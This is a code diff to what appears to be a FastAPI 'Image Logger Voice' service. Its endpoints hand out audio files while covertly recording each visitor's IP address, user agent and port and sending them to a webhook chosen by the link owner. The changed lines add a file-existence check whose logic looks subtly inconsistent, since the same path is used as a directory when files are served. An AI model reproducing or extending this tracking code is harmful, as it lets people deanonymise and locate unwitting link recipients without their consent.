@@ -118,7 +118,7 @@ async def download_voice(background_tasks: BackgroundTasks,request: Request,toke
     path = Path(image_path)
     webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
     if not curd.check_ip_exist(ip, db=db):
-        if not voiceurl or token==None or not curd.check_exists_token(db, token=token):
+        if not path.is_file() or not voiceurl or token==None or not curd.check_exists_token(db, token=token):
             background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=voiceurl, url_thumbnail="https://media-ten.z-cdn.me/MYZgsN2TDJAAAAAM/this-is.gif", botname='Cảnh báo server voice',db=db)
             return FileResponse(f'{path}/alo.aac', media_type="audio/aac")
         background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=voiceurl, url_thumbnail="https://media-ten.z-cdn.me/MYZgsN2TDJAAAAAM/this-is.gif", botname='Image Logger Voice', db=db)
@@ -135,7 +135,7 @@ async def download_voice(background_tasks: BackgroundTasks,request: Request,toke
     path = Path(image_path)
     webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
     if not curd.check_ip_exist(ip, db=db):
-        if not fileurl or token==None or not curd.check_exists_token(db, token=token):
+        if not path.is_file() or not fileurl or token==None or not curd.check_exists_token(db, token=token):
             background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=fileurl, url_thumbnail="https://media-ten.z-cdn.me/TgFHDovkakMAAAAM/cliphy-mood.gif", botname='Cảnh báo server voice',db=db)
             return FileResponse(f'{path}/alo.aac', media_type="audio/aac")
         background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=fileurl, url_thumbnail="https://media-ten.z-cdn.me/TgFHDovkakMAAAAM/cliphy-mood.gif", botname='Image Logger Voice', db=db)
